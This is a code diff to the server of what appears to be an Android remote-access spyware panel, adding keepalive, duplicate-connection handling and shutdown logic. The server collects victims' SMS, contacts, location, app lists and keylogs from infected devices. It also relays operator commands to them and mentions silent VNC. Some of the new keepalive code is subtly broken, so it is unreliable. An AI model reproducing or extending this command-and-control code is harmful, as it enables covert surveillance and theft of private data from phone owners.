@@ -1,21 +1,30 @@
 'use strict';
 require('dotenv').config();
 
-const path    = require('path');
-const express = require('express');
-const http    = require('http');
+const path      = require('path');
+const express   = require('express');
+const http      = require('http');
 const WebSocket = require('ws');
-const cors    = require('cors');
-const jwt     = require('jsonwebtoken');
+const cors      = require('cors');
+const jwt       = require('jsonwebtoken');
 const { v4: uuidv4 } = require('uuid');
-const db      = require('./db/database');
-const authRoutes  = require('./routes/auth');
+const db        = require('./db/database');
+const authRoutes    = require('./routes/auth');
 const builderRoutes = require('./routes/builder');
 const { authMiddleware } = require('./middleware/auth');
 
 const PORT          = process.env.PORT || 3000;
 const DEVICE_SECRET = process.env.DEVICE_SECRET || '';
 const FRONTEND_DIST = path.join(__dirname, '..', 'frontend', 'dist');
+
+// ─── Keepalive tuning ─────────────────────────────────────────────────────────
+// Render (and most cloud proxies) kill idle TCP after ~60s.
+// We ping every 20s to keep the connection warm.
+// If a socket misses 3 pongs (60s), we reap it as dead.
+
+const PING_INTERVAL     = 20_000;   // ms between protocol pings
+const PONG_TIMEOUT      = 60_000;   // ms before declaring a socket dead
+const MAX_MISSED_PONGS  = 3;
 
 // ─── Express ─────────────────────────────────────────────────────────────────
 
@@ -26,16 +35,16 @@ app.use(express.json({ limit: '50mb' }));
 const server = http.createServer(app);
 
 // ─── WebSocket servers ────────────────────────────────────────────────────────
-// /ws   → Android devices  (CCS binary + JSON protocol)
-// /panel → Browser panel   (JSON protocol, JWT auth)
+// /ws    → Android devices  (CCS binary + JSON protocol)
+// /panel → Browser panel    (JSON protocol, JWT auth)
 
 const deviceWss = new WebSocket.Server({ noServer: true, maxPayload: 50 * 1024 * 1024 });
 const panelWss  = new WebSocket.Server({ noServer: true });
 
-// Live device registry: deviceId → { ws, ip, info }
+// Live device registry: deviceId → { ws, ip, info, lastPing, missedPongs }
 const deviceMap  = new Map();
-// Authenticated panel sockets
-const panelConns = new Set();
+// Authenticated panel sockets: ws → { lastPing, missedPongs }
+const panelConns = new Map();
 
 // ─── HTTP upgrade routing ─────────────────────────────────────────────────────
 
@@ -61,16 +70,81 @@ server.on('upgrade', (req, socket, head) => {
 
 function toPanel(obj) {
   const s = JSON.stringify(obj);
-  panelConns.forEach(ws => {
+  panelConns.forEach((meta, ws) => {
     if (ws.readyState === WebSocket.OPEN) ws.send(s);
   });
 }
 
 function toPanelBinary(buf) {
-  panelConns.forEach(ws => {
+  panelConns.forEach((meta, ws) => {
     if (ws.readyState === WebSocket.OPEN) ws.send(buf);
   });
 }
+
+// ─── Keepalive engine ─────────────────────────────────────────────────────────
+
+function startKeepalive(wss, connMap, label) {
+  const timer = setInterval(() => {
+    const now = Date.now();
+
+    wss.clients.forEach(ws => {
+      if (ws.readyState !== WebSocket.OPEN) return;
+
+      const meta = connMap.get(ws);
+      if (!meta) return;
+
+      // Check for dead socket — missed too many pongs
+      if (now - meta.lastPing > PONG_TIMEOUT && meta.missedPongs >= MAX_MISSED_PONGS) {
+        console.log(`[${label}] Reaping dead socket (missed ${meta.missedPongs} pongs)`);
+        ws.terminate(); // Force close — triggers 'close' event
+        return;
+      }
+
+      // Count this ping as potentially missed if we haven't seen a pong
+      if (meta.missedPongs > 0 && now - meta.lastPong > PING_INTERVAL * 2) {
+        meta.missedPongs++;
+      } else {
+        meta.missedPongs = 0;
+      }
+
+      // Send protocol ping
+      try {
+        ws.ping();
+        meta.lastPing = now;
+      } catch {
+        ws.terminate();
+      }
+    });
+  }, PING_INTERVAL);
+
+  timer.unref(); // Don't keep process alive just for pings
+  return timer;
+}
+
+// Track pongs on both namespaces
+deviceWss.on('pong', (ws) => {
+  const meta = panelConns.get(ws); // check panel first (same ws object won't be in both, but be safe)
+  // Find which map has this ws
+  for (const [id, entry] of deviceMap) {
+    if (entry.ws === ws) {
+      entry.missedPongs = 0;
+      entry.lastPong = Date.now();
+      return;
+    }
+  }
+});
+
+panelWss.on('pong', (ws) => {
+  const meta = panelConns.get(ws);
+  if (meta) {
+    meta.missedPongs = 0;
+    meta.lastPong = Date.now();
+  }
+});
+
+// Start keepalive timers
+startKeepalive(deviceWss, panelConns, 'DEVICE');
+startKeepalive(panelWss, panelConns, 'PANEL');
 
 // ─── /ws — Device namespace ───────────────────────────────────────────────────
 
@@ -82,6 +156,10 @@ deviceWss.on('connection', (ws, req) => {
   // CCS puts device_id in query param immediately on connect
   let deviceId = url.searchParams.get('device_id') || null;
   let registered = false;
+
+  // Track connection metadata for keepalive
+  const connMeta = { lastPing: Date.now(), lastPong: Date.now(), missedPongs: 0 };
+  panelConns.set(ws, connMeta); // reuse panelConns map for keepalive tracking
 
   // Auth timeout — close if no DEVICE_INFO within 15s
   const authTimer = setTimeout(() => {
@@ -111,7 +189,7 @@ deviceWss.on('connection', (ws, req) => {
         header.writeUInt16BE(devIdBuf.length, 1);
         toPanelBinary(Buffer.concat([header, devIdBuf, payload]));
 
-        // Throttle last_seen update (every 5s max)
+        // Update last_seen on activity
         const now = Date.now();
         if (!ws._lastSeenUpdate || now - ws._lastSeenUpdate > 5000) {
           ws._lastSeenUpdate = now;
@@ -136,7 +214,22 @@ deviceWss.on('connection', (ws, req) => {
 
       // Prefer query-param device_id; fall back to message body
       deviceId = deviceId || msg.device_id || uuidv4();
-      deviceMap.set(deviceId, { ws, ip });
+
+      // If this device already has a live connection, kill the old one
+      const existing = deviceMap.get(deviceId);
+      if (existing && existing.ws !== ws && existing.ws.readyState === WebSocket.OPEN) {
+        console.log(`[DEVICE] Duplicate connection for ${deviceId} — killing old socket`);
+        existing.ws.terminate();
+      }
+
+      deviceMap.set(deviceId, {
+        ws,
+        ip,
+        info: msg,
+        lastPing: Date.now(),
+        lastPong: Date.now(),
+        missedPongs: 0,
+      });
 
       // Store in DB
       await db.upsertDevice(deviceId, msg, ip).catch(() => {});
@@ -145,7 +238,6 @@ deviceWss.on('connection', (ws, req) => {
       const pending = await db.getCommands(deviceId, 50).catch(() => []);
       for (const cmd of pending.filter(c => c.status === 'pending')) {
         if (ws.readyState === WebSocket.OPEN) {
-          // Send as bare {action, ...params} — the format CCS expects
           const payload = { action: cmd.action, ...(cmd.params || {}) };
           ws.send(JSON.stringify(payload));
           await db.updateCommand(cmd.id, 'sent').catch(() => {});
@@ -174,16 +266,10 @@ deviceWss.on('connection', (ws, req) => {
     }
 
     // ── All other messages: route to panel + save to DB ───────────────────────
-    // Map CCS type → DB data_type
-    // Map CCS outbound message type → DB data_type
-    // sendResponse("TYPE", jsonString) → {"type":"TYPE","data":"..."}
-    // Direct JSON objects → {"type":"TYPE", ...fields}
     const TYPE_TO_DB = {
-      // sendResponse() wrappers — data field is a JSON string
       'SMS':             'sms',
       'CONTACTS':        'contacts',
       'LOCATION':        'location',
-      // Direct JSON objects
       'INSTALLED_APPS':  'apps',
       'KEYLOG':          'keylog',
       'KEYLOG_OFFLINE':  'keylog',
@@ -209,12 +295,6 @@ deviceWss.on('connection', (ws, req) => {
       ).catch(() => {});
     }
 
-    // SILENT_VNC_STATUS → don't save, just forward
-    // OK/ERROR → command responses (update command record if we had a cmdId)
-    if (msgType === 'OK' || msgType === 'ERROR' || msgType === 'PONG') {
-      // These are just forwarded to panel, nothing to save
-    }
-
     // Forward everything to panel
     toPanel({
       type: 'device_data',
@@ -228,11 +308,17 @@ deviceWss.on('connection', (ws, req) => {
   // ── Disconnect ─────────────────────────────────────────────────────────────
   ws.on('close', async () => {
     clearTimeout(authTimer);
+    panelConns.delete(ws); // clean keepalive tracking
+
     if (deviceId) {
-      deviceMap.delete(deviceId);
-      await db.setDeviceOffline(deviceId).catch(() => {});
-      toPanel({ type: 'device_disconnected', deviceId });
-      console.log(`[DEVICE] Disconnected: ${deviceId}`);
+      // Only mark offline if this ws is the current registered one
+      const entry = deviceMap.get(deviceId);
+      if (entry && entry.ws === ws) {
+        deviceMap.delete(deviceId);
+        await db.setDeviceOffline(deviceId).catch(() => {});
+        toPanel({ type: 'device_disconnected', deviceId });
+        console.log(`[DEVICE] Disconnected: ${deviceId}`);
+      }
     }
   });
 
@@ -245,6 +331,10 @@ deviceWss.on('connection', (ws, req) => {
 
 panelWss.on('connection', ws => {
   let authed = false;
+
+  // Track for keepalive
+  const connMeta = { lastPing: Date.now(), lastPong: Date.now(), missedPongs: 0 };
+  panelConns.set(ws, connMeta);
 
   const authTimer = setTimeout(() => {
     if (!authed) ws.close(4001, 'auth timeout');
@@ -260,7 +350,6 @@ panelWss.on('connection', ws => {
         jwt.verify(msg.token, process.env.JWT_SECRET);
         clearTimeout(authTimer);
         authed = true;
-        panelConns.add(ws);
         ws.send(JSON.stringify({ type: 'auth_ok' }));
 
         // Push device list + mark which are live
@@ -299,7 +388,6 @@ panelWss.on('connection', ws => {
 
       const entry = deviceMap.get(deviceId);
       if (entry && entry.ws.readyState === WebSocket.OPEN) {
-        // CCS expects bare: {"action":"X", ...params}
         const payload = JSON.stringify({ action, ...params });
         entry.ws.send(payload);
         await db.updateCommand(cmdId, 'sent').catch(() => {});
@@ -322,7 +410,13 @@ panelWss.on('connection', ws => {
 // ─── REST API ─────────────────────────────────────────────────────────────────
 
 app.get('/health', (_req, res) =>
-  res.json({ ok: true, uptime: process.uptime(), devices: deviceMap.size, panel: panelConns.size })
+  res.json({
+    ok: true,
+    uptime: process.uptime(),
+    devices: deviceMap.size,
+    panel: panelConns.size,
+    timestamp: Date.now(),
+  })
 );
 
 app.use('/api/auth', authRoutes);
@@ -343,7 +437,7 @@ async function dispatchCommand(deviceId, action, params = {}) {
 
 // All /api/* require auth
 app.use('/api', authMiddleware, async (req, res) => {
-  const parts = req.path.split('/').filter(Boolean);  // e.g. ['devices','abc','data','sms']
+  const parts = req.path.split('/').filter(Boolean);
 
   try {
     // GET /api/devices
@@ -371,11 +465,10 @@ app.use('/api', authMiddleware, async (req, res) => {
       return res.json(await db.getData(parts[1], parts[3], limit));
     }
 
-    // POST /api/devices/:id/cmd  body: {action, param1, param2, ...}  OR  {action, params:{...}}
+    // POST /api/devices/:id/cmd
     if (req.method === 'POST' && parts[0] === 'devices' && parts[2] === 'cmd') {
       const { action, params: nestedParams, ...rest } = req.body;
       if (!action) return res.status(400).json({ error: 'action required' });
-      // Merge nested params object + any top-level extra fields
       const allParams = { ...(nestedParams || {}), ...rest };
       return res.json(await dispatchCommand(parts[1], action, allParams));
     }
@@ -392,8 +485,7 @@ app.use('/api', authMiddleware, async (req, res) => {
   }
 });
 
-// Global error handler — anything that slips through returns JSON from /api
-// and never leaks an HTML error page into the panel's fetch parser.
+// Global error handler
 app.use('/api', (err, _req, res, _next) => {
   console.error('[API]', err.message);
   res.status(500).json({ error: 'Internal error' });
@@ -407,6 +499,17 @@ app.get('*', (_req, res) => res.sendFile(path.join(FRONTEND_DIST, 'index.html'))
 
 process.on('SIGTERM', () => {
   console.log('[SERVER] SIGTERM — shutting down');
+  // Close all live connections gracefully
+  deviceWss.clients.forEach(ws => ws.close(1001, 'server shutdown'));
+  panelWss.clients.forEach(ws => ws.close(1001, 'server shutdown'));
+  server.close(() => process.exit(0));
+  setTimeout(() => process.exit(1), 25000);
+});
+
+process.on('SIGINT', () => {
+  console.log('[SERVER] SIGINT — shutting down');
+  deviceWss.clients.forEach(ws => ws.close(1001, 'server shutdown'));
+  panelWss.clients.forEach(ws => ws.close(1001, 'server shutdown'));
   server.close(() => process.exit(0));
   setTimeout(() => process.exit(1), 25000);
 });
@@ -419,6 +522,7 @@ db.init()
       console.log(`[SERVER] ✓ Listening :${PORT}`);
       console.log(`[SERVER] Device WS → ws://host:${PORT}/ws`);
       console.log(`[SERVER] Panel  WS → ws://host:${PORT}/panel`);
+      console.log(`[SERVER] Keepalive: ping every ${PING_INTERVAL / 1000}s, reap after ${PONG_TIMEOUT / 1000}s`);
     });
   })
   .catch(err => {
